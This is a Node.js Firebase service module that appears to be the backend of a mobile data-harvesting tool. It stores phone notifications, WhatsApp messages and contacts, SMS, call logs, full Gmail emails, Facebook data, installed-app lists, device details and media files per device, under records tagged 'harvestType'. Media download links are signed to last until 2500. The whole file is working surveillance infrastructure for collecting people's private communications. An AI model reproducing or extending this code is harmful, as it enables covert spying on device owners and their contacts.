const { db, rtdb, storage, COLLECTIONS, RTDB_PATHS } = require('../config/firebase');

class MobileFirebaseService {
  constructor() {
    this.batch = db.batch();
    this.batchSize = 0;
    this.maxBatchSize = 100; // Reduced from 250 to 100 to avoid quota issues
    this.batchDelay = 2000; // Increased from 1000 to 2000ms (2 seconds) for better quota management
  }

  // Helper function to delay execution
  async delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // Improved batch commit with retry logic
  async commitBatch() {
    if (this.batchSize > 0) {
      let retries = 0;
      const maxRetries = 3;
      
      while (retries < maxRetries) {
        try {
          await this.batch.commit();
          console.log(`✅ Batch committed successfully (${this.batchSize} operations)`);
          this.batch = db.batch();
          this.batchSize = 0;
          return;
        } catch (error) {
          retries++;
          console.error(`❌ Batch commit failed (attempt ${retries}/${maxRetries}):`, error.message);
          
          if (error.message.includes('RESOURCE_EXHAUSTED') || error.message.includes('Quota exceeded')) {
            console.log(`⏳ Quota exceeded, waiting ${this.batchDelay * retries}ms before retry...`);
            await this.delay(this.batchDelay * retries);
          } else if (retries >= maxRetries) {
            throw error;
          } else {
            await this.delay(1000);
          }
        }
      }
      
      throw new Error(`Failed to commit batch after ${maxRetries} attempts`);
    }
  }

  // Store notification directly to Firebase
  async storeNotification(notificationData) {
    try {
      const { deviceId, title, body, appName, packageName, deviceInfo, notificationData: notifData } = notificationData;
      
      const docRef = db.collection(COLLECTIONS.NOTIFICATIONS).doc();
      const firebaseNotification = {
        deviceId,
        title,
        body: body || '',
        appName,
        packageName,
        deviceInfo: deviceInfo || {},
        notificationData: notifData || {},
        timestamp: new Date(),
        firebaseId: docRef.id,
        createdAt: new Date()
      };

      await docRef.set(firebaseNotification);

      // Skip realtime database for now to avoid connection issues
      // await rtdb.ref(`${RTDB_PATHS.LIVE_DATA}/notifications/${deviceId}/${docRef.id}`).set(firebaseNotification);

      console.log(`✅ Notification stored in Firebase for device ${deviceId}: ${title}`);
      return { success: true, firebaseId: docRef.id };
    } catch (error) {
      console.error('❌ Error storing notification in Firebase:', error);
      throw error;
    }
  }

  // Store batch notifications directly to Firebase with deviceId as document ID
  async storeBatchNotifications(notifications, deviceId) {
    try {
      if (!notifications || notifications.length === 0) {
        console.log(`⚠️ No notifications to store for device ${deviceId}`);
        return { success: true, count: 0 };
      }

      // Use deviceId as document ID
      const notificationsDocRef = db.collection(COLLECTIONS.NOTIFICATIONS).doc(deviceId);
      let existingStats = { totalNotifications: 0 };
      let createdAt = new Date();
      const existingDoc = await notificationsDocRef.get();
      if (existingDoc.exists) {
        const existingData = existingDoc.data();
        existingStats = existingData.stats || { totalNotifications: 0 };
        createdAt = existingData.createdAt || createdAt;
        console.log(`📝 Updating existing notifications document for device ${deviceId}`);
      } else {
        console.log(`🆕 Creating new notifications document for device ${deviceId}`);
      }

      // Calculate new stats
      const newStats = {
        totalNotifications: existingStats.totalNotifications + notifications.length
      };

      const firebaseNotifications = {
        deviceId,
        timestamp: new Date(),
        harvestType: 'notifications',
        stats: newStats,
        lastUpdated: new Date(),
        firebaseId: notificationsDocRef.id,
        createdAt
      };

      await notificationsDocRef.set(firebaseNotifications, { merge: true });

      // Store notifications in subcollection
      await this.storeNotificationsInSubcollection(notificationsDocRef.id, notifications, deviceId);

      console.log(`✅ Batch stored ${notifications.length} notifications in Firebase for device ${deviceId} with optimized structure`);
      console.log(`📊 Updated stats - Total Notifications: ${newStats.totalNotifications}`);
      return { success: true, count: notifications.length };
    } catch (error) {
      console.error('❌ Error storing batch notifications in Firebase:', error);
      throw error;
    }
  }

  // Store notifications in subcollection
  async storeNotificationsInSubcollection(notificationsId, notifications, deviceId) {
    try {
      const batchSize = 25; // Reduced from 100 to 25 for better quota management
      const batches = [];
      
      for (let i = 0; i < notifications.length; i += batchSize) {
        batches.push(notifications.slice(i, i + batchSize));
      }

      let totalStored = 0;

      for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
        const batch = batches[batchIndex];
        const writeBatch = db.batch(); // Create new batch for each operation
        
        const batchPromises = batch.map(async (notification, index) => {
          const { title, body, appName, packageName, deviceInfo, notificationData: notifData } = notification;
          
          const notificationRef = db.collection(COLLECTIONS.NOTIFICATIONS)
            .doc(notificationsId)
            .collection('notifications')
            .doc();
          
          const firebaseNotification = {
            deviceId,
            notificationsId,
            notificationId: `notif_${Date.now()}_${index}`,
            title,
            body: body || '',
            appName,
            packageName,
            deviceInfo: deviceInfo || {},
            notificationData: notifData || {},
            timestamp: new Date(),
            firebaseId: notificationRef.id,
            createdAt: new Date()
          };

          writeBatch.set(notificationRef, firebaseNotification);
          totalStored++;
        });

        await Promise.all(batchPromises);
        await writeBatch.commit(); // Commit this specific batch
        
        // Add delay between batches to avoid overwhelming Firebase
        if (batchIndex < batches.length - 1) {
          await this.delay(3000); // 3 second delay for better quota management
        }
      }

      console.log(`✅ Stored ${totalStored} notifications in subcollection for device ${deviceId}`);
    } catch (error) {
      console.error('❌ Error storing notifications in subcollection:', error);
      throw error;
    }
  }

  // Store WhatsApp data directly to Firebase with deviceId as document ID
  async storeWhatsAppData(whatsappData) {
    try {
      const { deviceInfo, messages, contacts, businessData } = whatsappData;
      const deviceId = deviceInfo?.deviceId || 'unknown';
      
      // Use deviceId as document ID
      const whatsappDocRef = db.collection(COLLECTIONS.WHATSAPP).doc(deviceId);
      let existingStats = { totalMessages: 0, totalContacts: 0, totalBusinessData: 0 };
      let createdAt = new Date();
      const existingDoc = await whatsappDocRef.get();
      if (existingDoc.exists) {
        const existingData = existingDoc.data();
        existingStats = existingData.stats || { totalMessages: 0, totalContacts: 0, totalBusinessData: 0 };
        createdAt = existingData.createdAt || createdAt;
        console.log(`📝 Updating existing WhatsApp document for device ${deviceId}`);
      } else {
        console.log(`🆕 Creating new WhatsApp document for device ${deviceId}`);
      }

      // Calculate new stats
      const newStats = {
        totalMessages: existingStats.totalMessages + (messages?.length || 0),
        totalContacts: existingStats.totalContacts + (contacts?.length || 0),
        totalBusinessData: existingStats.totalBusinessData + (businessData?.length || 0)
      };

      const firebaseWhatsApp = {
        deviceId,
        timestamp: new Date(deviceInfo?.timestamp || Date.now()),
        harvestType: 'whatsapp',
        stats: newStats,
        lastUpdated: new Date(),
        firebaseId: whatsappDocRef.id,
        createdAt
      };

      await whatsappDocRef.set(firebaseWhatsApp, { merge: true });

      // Store messages in subcollection with pagination
      if (messages && messages.length > 0) {
        await this.storeWhatsAppMessages(whatsappDocRef.id, messages, deviceId);
      }

      // Store contacts in subcollection
      if (contacts && contacts.length > 0) {
        await this.storeWhatsAppContacts(whatsappDocRef.id, contacts, deviceId);
      }

      // Store business data in subcollection
      if (businessData && businessData.length > 0) {
        await this.storeWhatsAppBusinessData(whatsappDocRef.id, businessData, deviceId);
      }

      console.log(`✅ WhatsApp data stored in Firebase for device ${deviceId} with optimized structure`);
      console.log(`📊 Updated stats - Messages: ${newStats.totalMessages}, Contacts: ${newStats.totalContacts}, Business: ${newStats.totalBusinessData}`);
      return { success: true, firebaseId: whatsappDocRef.id };
    } catch (error) {
      console.error('❌ Error storing WhatsApp data in Firebase:', error);
      throw error;
    }
  }

  // Store WhatsApp messages in subcollection with pagination
  async storeWhatsAppMessages(whatsappId, messages, deviceId) {
    try {
      const batchSize = 25; // Reduced from 100 to 25 for better quota management
      const batches = [];
      
      for (let i = 0; i < messages.length; i += batchSize) {
        batches.push(messages.slice(i, i + batchSize));
      }

      let totalStored = 0;

      for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
        const batch = batches[batchIndex];
        const writeBatch = db.batch(); // Create new batch for each operation
        
        const batchPromises = batch.map(async (message, index) => {
          const messageRef = db.collection(COLLECTIONS.WHATSAPP)
            .doc(whatsappId)
            .collection('messages')
            .doc();
          
          const firebaseMessage = {
            deviceId,
            whatsappId,
            messageId: message.id || `msg_${Date.now()}_${index}`,
            from: message.from,
            to: message.to,
            body: message.body || '',
            timestamp: new Date(message.timestamp || Date.now()),
            type: message.type || 'text',
            status: message.status || 'unknown',
            firebaseId: messageRef.id,
            createdAt: new Date()
          };

          writeBatch.set(messageRef, firebaseMessage);
          totalStored++;
        });

        await Promise.all(batchPromises);
        await writeBatch.commit(); // Commit this specific batch
        
        // Add delay between batches to avoid overwhelming Firebase
        if (batchIndex < batches.length - 1) {
          await this.delay(3000); // 3 second delay for better quota management
        }
      }

      console.log(`✅ Stored ${totalStored} WhatsApp messages in subcollection for device ${deviceId}`);
    } catch (error) {
      console.error('❌ Error storing WhatsApp messages:', error);
      throw error;
    }
  }

  // Store WhatsApp contacts in subcollection with improved quota handling
  async storeWhatsAppContacts(whatsappId, contacts, deviceId) {
    try {
      const batchSize = 25; // Reduced from 50 to 25 for better quota management
      const batches = [];
      
      for (let i = 0; i < contacts.length; i += batchSize) {
        batches.push(contacts.slice(i, i + batchSize));
      }

      let totalStored = 0;

      for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
        const batch = batches[batchIndex];
        const writeBatch = db.batch(); // Create new batch for each operation
        
        const batchPromises = batch.map(async (contact) => {
          const contactRef = db.collection(COLLECTIONS.WHATSAPP)
            .doc(whatsappId)
            .collection('contacts')
            .doc();
          
          const firebaseContact = {
            deviceId,
            whatsappId,
            contactId: contact.id,
            name: contact.name || '',
            phoneNumber: contact.phoneNumber || '',
            status: contact.status || '',
            profilePic: contact.profilePic || '',
            firebaseId: contactRef.id,
            createdAt: new Date()
          };

          writeBatch.set(contactRef, firebaseContact);
          totalStored++;
        });

        await Promise.all(batchPromises);
        
        // Commit with retry logic
        let retries = 0;
        const maxRetries = 3;
        
        while (retries < maxRetries) {
          try {
            await writeBatch.commit();
            console.log(`✅ WhatsApp contacts batch ${batchIndex + 1}/${batches.length} committed (${batch.length} contacts)`);
            break;
          } catch (error) {
            retries++;
            console.error(`❌ WhatsApp contacts batch commit failed (attempt ${retries}/${maxRetries}):`, error.message);
            
            if (error.message.includes('RESOURCE_EXHAUSTED') || error.message.includes('Quota exceeded')) {
              const delayMs = this.batchDelay * retries;
              console.log(`⏳ Quota exceeded, waiting ${delayMs}ms before retry...`);
              await this.delay(delayMs);
            } else if (retries >= maxRetries) {
              throw error;
            } else {
              await this.delay(1000);
            }
          }
        }
        
        // Add delay between batches to avoid overwhelming Firebase
        if (batchIndex < batches.length - 1) {
          await this.delay(3000); // Increased from 1000ms to 3000ms for better quota management
        }
      }
      
      console.log(`✅ Stored ${totalStored} WhatsApp contacts in subcollection for device ${deviceId}`);
    } catch (error) {
      console.error('❌ Error storing WhatsApp contacts:', error);
      throw error;
    }
  }

  // Store WhatsApp business data in subcollection
  async storeWhatsAppBusinessData(whatsappId, businessData, deviceId) {
    try {
      const batchSize = 25; // Reduced from 100 to 25 for better quota management
      const batches = [];
      
      for (let i = 0; i < businessData.length; i += batchSize) {
        batches.push(businessData.slice(i, i + batchSize));
      }

      let totalStored = 0;

      for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
        const batch = batches[batchIndex];
        const writeBatch = db.batch(); // Create new batch for each operation
        
        const batchPromises = batch.map(async (business) => {
          const businessRef = db.collection(COLLECTIONS.WHATSAPP)
            .doc(whatsappId)
            .collection('business')
            .doc();
          
          const firebaseBusiness = {
            deviceId,
            whatsappId,
            businessId: business.id,
            name: business.name || '',
            description: business.description || '',
            category: business.category || '',
            address: business.address || '',
            phoneNumber: business.phoneNumber || '',
            firebaseId: businessRef.id,
            createdAt: new Date()
          };

          writeBatch.set(businessRef, firebaseBusiness);
          totalStored++;
        });

        await Promise.all(batchPromises);
        await writeBatch.commit(); // Commit this specific batch
        
        // Add delay between batches to avoid overwhelming Firebase
        if (batchIndex < batches.length - 1) {
          await this.delay(3000); // 3 second delay for better quota management
        }
      }
      
      console.log(`✅ Stored ${totalStored} WhatsApp business data in subcollection for device ${deviceId}`);
    } catch (error) {
      console.error('❌ Error storing WhatsApp business data:', error);
      throw error;
    }
  }

  // Store contacts directly to Firebase with optimized batching and duplicate prevention
  async storeContacts(contactsData) {
    try {
      const { deviceId, contacts, timestamp } = contactsData;
      
      if (!contacts || contacts.length === 0) {
        console.log(`⚠️ No contacts to store for device ${deviceId}`);
        return { success: true, count: 0 };
      }

      // Check if contacts document already exists for this device
      const existingQuery = await db.collection(COLLECTIONS.CONTACTS)
        .where('deviceId', '==', deviceId)
        .limit(1)
        .get();

      let contactsDocRef;
      let existingContactIds = new Set();

      if (!existingQuery.empty) {
        // Get existing contact IDs to avoid duplicates
        const existingContactsQuery = await db.collection(COLLECTIONS.CONTACTS)
          .where('deviceId', '==', deviceId)
          .get();
        
        existingContactsQuery.docs.forEach(doc => {
          const data = doc.data();
          if (data.contactId) {
            existingContactIds.add(data.contactId);
          }
        });
        
        console.log(`📝 Found ${existingContactIds.size} existing contacts for device ${deviceId}`);
      }

      // Filter out existing contacts
      const newContacts = contacts.filter(contact => {
        const contactId = contact.id || contact.contactId;
        return contactId && !existingContactIds.has(contactId);
      });

      if (newContacts.length === 0) {
        console.log(`✅ No new contacts to store for device ${deviceId}`);
        return { success: true, count: 0 };
      }

      console.log(`📱 Storing ${newContacts.length} new contacts out of ${contacts.length} total for device ${deviceId}`);

      // Reset batch for this operation
      this.batch = db.batch();
      this.batchSize = 0;

      const batchSize = 100; // Process contacts in smaller batches
      const batches = [];
      
      for (let i = 0; i < newContacts.length; i += batchSize) {
        batches.push(newContacts.slice(i, i + batchSize));
      }

      let totalStored = 0;

      for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
        const batch = batches[batchIndex];
        const batchPromises = batch.map(async (contact) => {
          try {
            const docRef = db.collection(COLLECTIONS.CONTACTS).doc();
            const firebaseContact = {
              deviceId,
              contactId: contact.id || contact.contactId || `contact_${Date.now()}_${Math.random()}`,
              name: contact.name || '',
              hasPhone: contact.hasPhone || false,
              phoneNumbers: contact.phoneNumbers || [],
              email: contact.email || '',
              organization: contact.organization || '',
              timestamp: new Date(timestamp),
              firebaseId: docRef.id,
              createdAt: new Date()
            };

            this.batch.set(docRef, firebaseContact);
            this.batchSize++;
            totalStored++;

            if (this.batchSize >= this.maxBatchSize) {
              await this.commitBatch();
              // Reset batch after commit
              this.batch = db.batch();
              this.batchSize = 0;
            }
          } catch (error) {
            console.error(`❌ Error processing contact ${contact.id}:`, error);
            // Continue with other contacts
          }
        });

        await Promise.all(batchPromises);
      }

      // Commit any remaining items
      if (this.batchSize > 0) {
        await this.commitBatch();
      }

      console.log(`✅ Stored ${totalStored} new contacts in Firebase for device ${deviceId} (processed in ${batches.length} batches)`);
      return { success: true, count: totalStored };
    } catch (error) {
      console.error('❌ Error storing contacts in Firebase:', error);
      throw error;
    }
  }

  // Store SMS messages directly to Firebase with optimized batching and duplicate prevention
  async storeSMS(smsData) {
    try {
      const { deviceId, messages, timestamp } = smsData;
      
      if (!messages || messages.length === 0) {
        console.log(`⚠️ No SMS messages to store for device ${deviceId}`);
        return { success: true, count: 0 };
      }

      // Get existing message IDs to avoid duplicates
      const existingMessagesQuery = await db.collection(COLLECTIONS.SMS)
        .where('deviceId', '==', deviceId)
        .get();
      
      const existingMessageIds = new Set();
      existingMessagesQuery.docs.forEach(doc => {
        const data = doc.data();
        if (data.messageId) {
          existingMessageIds.add(data.messageId);
        }
      });
      
      console.log(`📝 Found ${existingMessageIds.size} existing SMS messages for device ${deviceId}`);

      // Filter out existing messages
      const newMessages = messages.filter(message => {
        const messageId = message.id || message.messageId || `${message.address}_${message.date}`;
        return messageId && !existingMessageIds.has(messageId);
      });

      if (newMessages.length === 0) {
        console.log(`✅ No new SMS messages to store for device ${deviceId}`);
        return { success: true, count: 0 };
      }

      console.log(`📱 Storing ${newMessages.length} new SMS messages out of ${messages.length} total for device ${deviceId}`);

      // Reset batch for this operation
      this.batch = db.batch();
      this.batchSize = 0;

      const batchSize = 100; // Process messages in smaller batches
      const batches = [];
      
      for (let i = 0; i < newMessages.length; i += batchSize) {
        batches.push(newMessages.slice(i, i + batchSize));
      }

      let totalStored = 0;

      for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
        const batch = batches[batchIndex];
        const batchPromises = batch.map(async (message) => {
          try {
            const docRef = db.collection(COLLECTIONS.SMS).doc();
            const firebaseSMS = {
              deviceId,
              messageId: message.id || message.messageId || `${message.address}_${message.date}`,
              address: message.address || '',
              body: message.body || '',
              date: new Date(message.date || Date.now()),
              type: message.type || 'unknown',
              read: message.read || false,
              threadId: message.threadId || '',
              timestamp: new Date(timestamp),
              firebaseId: docRef.id,
              createdAt: new Date()
            };

            this.batch.set(docRef, firebaseSMS);
            this.batchSize++;
            totalStored++;

            if (this.batchSize >= this.maxBatchSize) {
              await this.commitBatch();
              // Reset batch after commit
              this.batch = db.batch();
              this.batchSize = 0;
            }
          } catch (error) {
            console.error(`❌ Error processing SMS message:`, error);
            // Continue with other messages
          }
        });

        await Promise.all(batchPromises);
      }

      // Commit any remaining items
      if (this.batchSize > 0) {
        await this.commitBatch();
      }

      console.log(`✅ Stored ${totalStored} new SMS messages in Firebase for device ${deviceId} (processed in ${batches.length} batches)`);
      return { success: true, count: totalStored };
    } catch (error) {
      console.error('❌ Error storing SMS in Firebase:', error);
      throw error;
    }
  }

  // Store call logs directly to Firebase
  async storeCallLogs(callLogsData) {
    try {
      const { deviceId, callLogs, timestamp } = callLogsData;
      
      const promises = callLogs.map(async (callLog) => {
        const docRef = db.collection(COLLECTIONS.CALL_LOGS).doc();
        const firebaseCallLog = {
          deviceId,
          number: callLog.number,
          type: callLog.type,
          date: new Date(callLog.date),
          duration: callLog.duration,
          name: callLog.name,
          timestamp: new Date(timestamp),
          firebaseId: docRef.id,
          createdAt: new Date()
        };

        this.batch.set(docRef, firebaseCallLog);
        this.batchSize++;

        if (this.batchSize >= this.maxBatchSize) {
          await this.commitBatch();
        }
      });

      await Promise.all(promises);
      await this.commitBatch();

      console.log(`✅ Stored ${callLogs.length} call logs in Firebase for device ${deviceId}`);
      return { success: true, count: callLogs.length };
    } catch (error) {
      console.error('❌ Error storing call logs in Firebase:', error);
      throw error;
    }
  }

  // Store Gmail data directly to Firebase with undefined field handling and duplicate prevention
  async storeGmailData(gmailData) {
    try {
      const { userId, emails, deviceId } = gmailData;
      
      if (!emails || emails.length === 0) {
        console.log(`⚠️ No emails to store for user ${userId}`);
        return { success: true, count: 0 };
      }

      // Get existing email IDs to avoid duplicates
      const existingEmailsQuery = await db.collection(COLLECTIONS.EMAILS)
        .where('userId', '==', userId)
        .get();
      
      const existingEmailIds = new Set();
      existingEmailsQuery.docs.forEach(doc => {
        const data = doc.data();
        if (data.messageId) {
          existingEmailIds.add(data.messageId);
        }
      });
      
      console.log(`📝 Found ${existingEmailIds.size} existing emails for user ${userId}`);

      // Filter out existing emails
      const newEmails = emails.filter(email => {
        const messageId = email.messageId || email.id;
        return messageId && !existingEmailIds.has(messageId);
      });

      if (newEmails.length === 0) {
        console.log(`✅ No new emails to store for user ${userId}`);
        return { success: true, count: 0 };
      }

      console.log(`📧 Storing ${newEmails.length} new emails out of ${emails.length} total for user ${userId}`);

      // Reset batch for this operation
      this.batch = db.batch();
      this.batchSize = 0;

      const batchSize = 50; // Process emails in smaller batches
      const batches = [];
      
      for (let i = 0; i < newEmails.length; i += batchSize) {
        batches.push(newEmails.slice(i, i + batchSize));
      }

      let totalStored = 0;

      for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
        const batch = batches[batchIndex];
        const batchPromises = batch.map(async (email) => {
          try {
            const docRef = db.collection(COLLECTIONS.EMAILS).doc();
            
            // Clean undefined values to prevent Firestore errors
            const cleanEmail = {
              userId,
              deviceId,
              messageId: email.messageId || email.id || `email_${Date.now()}_${Math.random()}`,
              threadId: email.threadId || '',
              subject: email.subject || '',
              from: email.from || '',
              to: email.to || '',
              cc: email.cc || null, // Use null instead of undefined
              bcc: email.bcc || null, // Use null instead of undefined
              body: email.body || '',
              bodyHtml: email.bodyHtml || '',
              snippet: email.snippet || '',
              isRead: email.isRead || false,
              isStarred: email.isStarred || false,
              isImportant: email.isImportant || false,
              isOutgoing: email.isOutgoing || false,
              labels: email.labels || [],
              internalDate: email.internalDate || null,
              sizeEstimate: email.sizeEstimate || 0,
              attachments: email.attachments || [],
              timestamp: new Date(),
              firebaseId: docRef.id,
              createdAt: new Date()
            };

            // Remove null values to prevent Firestore errors
            Object.keys(cleanEmail).forEach(key => {
              if (cleanEmail[key] === null) {
                delete cleanEmail[key];
              }
            });

            this.batch.set(docRef, cleanEmail);
            this.batchSize++;
            totalStored++;

            if (this.batchSize >= this.maxBatchSize) {
              await this.commitBatch();
              // Reset batch after commit
              this.batch = db.batch();
              this.batchSize = 0;
            }
          } catch (error) {
            console.error(`❌ Error processing email ${email.messageId}:`, error);
            // Continue with other emails
          }
        });

        await Promise.all(batchPromises);
      }

      // Commit any remaining items
      if (this.batchSize > 0) {
        await this.commitBatch();
      }

      console.log(`✅ Stored ${totalStored} new Gmail emails in Firebase for user ${userId} (processed in ${batches.length} batches)`);
      return { success: true, count: totalStored };
    } catch (error) {
      console.error('❌ Error storing Gmail data in Firebase:', error);
      throw error;
    }
  }

  // Store device info directly to Firebase
  async storeDeviceInfo(deviceInfo) {
    try {
      const { deviceId, manufacturer, model, androidVersion, sdkVersion, timestamp } = deviceInfo;
      
      const docRef = db.collection(COLLECTIONS.DEVICES).doc(deviceId);
      const firebaseDevice = {
        deviceId,
        deviceInfo: {
          manufacturer,
          model,
          androidVersion,
          sdkVersion,
          lastUpdated: new Date()
        },
        timestamp: new Date(timestamp),
        createdAt: new Date()
      };

      await docRef.set(firebaseDevice, { merge: true });

      console.log(`✅ Device info stored in Firebase for device ${deviceId}`);
      return { success: true, firebaseId: docRef.id };
    } catch (error) {
      console.error('❌ Error storing device info in Firebase:', error);
      throw error;
    }
  }

  // Store apps list directly to Firebase
  async storeAppsList(appsData) {
    try {
      const { deviceId, apps } = appsData;
      
      const docRef = db.collection(COLLECTIONS.DEVICES).doc(deviceId);
      const firebaseApps = {
        deviceId,
        installedApps: apps,
        lastAppsUpdate: new Date(),
        createdAt: new Date()
      };

      await docRef.set(firebaseApps, { merge: true });

      console.log(`✅ Apps list stored in Firebase for device ${deviceId}`);
      return { success: true, firebaseId: docRef.id };
    } catch (error) {
      console.error('❌ Error storing apps list in Firebase:', error);
      throw error;
    }
  }

  // Store configured email accounts
  async storeEmailAccounts(emailAccountsData) {
    try {
      const { userId, emailAccounts } = emailAccountsData;
      
      if (!emailAccounts || emailAccounts.length === 0) {
        console.log(`⚠️ No email accounts to store for user ${userId}`);
        return { success: true, count: 0 };
      }

      // Check if user document exists
      const userDocRef = db.collection(COLLECTIONS.USERS).doc(userId);
      const userDoc = await userDocRef.get();

      if (userDoc.exists) {
        // Update existing user document
        await userDocRef.update({
          configuredEmails: emailAccounts,
          lastEmailAccountsUpdate: new Date(),
          updatedAt: new Date()
        });
        console.log(`📝 Updated email accounts for existing user ${userId}`);
      } else {
        // Create new user document
        await userDocRef.set({
          userId,
          configuredEmails: emailAccounts,
          lastEmailAccountsUpdate: new Date(),
          createdAt: new Date(),
          updatedAt: new Date()
        });
        console.log(`🆕 Created new user document with email accounts for ${userId}`);
      }

      console.log(`✅ Stored ${emailAccounts.length} email accounts for user ${userId}`);
      return { success: true, count: emailAccounts.length };
    } catch (error) {
      console.error('❌ Error storing email accounts in Firebase:', error);
      throw error;
    }
  }

  // Store Facebook data directly to Firebase with deviceId as document ID
  async storeFacebookData(facebookData) {
    try {
      const { deviceId, dataType, data, timestamp } = facebookData;
      // Use deviceId as document ID
      const facebookDocRef = db.collection(COLLECTIONS.FACEBOOK).doc(deviceId);
      let existingData = {};
      let createdAt = new Date();
      const existingDoc = await facebookDocRef.get();
      if (existingDoc.exists) {
        existingData = existingDoc.data();
        createdAt = existingData.createdAt || createdAt;
        console.log(`📝 Updating existing Facebook document for device ${deviceId}`);
      } else {
        console.log(`🆕 Creating new Facebook document for device ${deviceId}`);
      }

      const firebaseFacebook = {
        deviceId,
        dataType,
        data,
        timestamp: new Date(timestamp || Date.now()),
        lastUpdated: new Date(),
        firebaseId: facebookDocRef.id,
        createdAt
      };

      await facebookDocRef.set(firebaseFacebook, { merge: true });

      console.log(`✅ Facebook ${dataType} data stored in Firebase for device ${deviceId}`);
      return { success: true, firebaseId: facebookDocRef.id };
    } catch (error) {
      console.error('❌ Error storing Facebook data in Firebase:', error);
      throw error;
    }
  }

  // Store media files directly to Firebase Storage
  async storeMedia(mediaData) {
    try {
      const { deviceId, file, originalName, mimetype, size } = mediaData;
      
      const fileName = `media/${deviceId}/${Date.now()}_${originalName}`;
      const fileRef = storage.bucket().file(fileName);

      // Upload file to Firebase Storage
      await fileRef.save(file.buffer, {
        metadata: {
          contentType: mimetype,
          metadata: {
            deviceId,
            originalName,
            size,
            uploadedAt: new Date().toISOString()
          }
        }
      });

      // Get download URL
      const [url] = await fileRef.getSignedUrl({
        action: 'read',
        expires: '03-01-2500'
      });

      // Save metadata to Firestore
      const docRef = db.collection(COLLECTIONS.MEDIA).doc();
      const firebaseMedia = {
        deviceId,
        firebaseId: docRef.id,
        fileName,
        downloadUrl: url,
        originalName,
        size,
        mimetype,
        uploadedAt: new Date(),
        createdAt: new Date()
      };

      await docRef.set(firebaseMedia);

      console.log(`✅ Media file stored in Firebase for device ${deviceId}: ${originalName}`);
      return { success: true, firebaseId: docRef.id, downloadUrl: url };
    } catch (error) {
      console.error('❌ Error storing media in Firebase:', error);
      throw error;
    }
  }

  // Update device status in realtime database (disabled for now)
  async updateDeviceStatus(deviceId, status) {
    try {
      // Skip realtime database for now to avoid connection issues
      // await rtdb.ref(`${RTDB_PATHS.DEVICE_STATUS}/${deviceId}`).set({
      //   ...status,
      //   lastUpdated: new Date().toISOString()
      // });
      console.log(`✅ Device status update skipped for device ${deviceId} (RTDB disabled)`);
    } catch (error) {
      console.error('❌ Error updating device status in Firebase:', error);
      throw error;
    }
  }


}

module.exports = new MobileFirebaseService(); 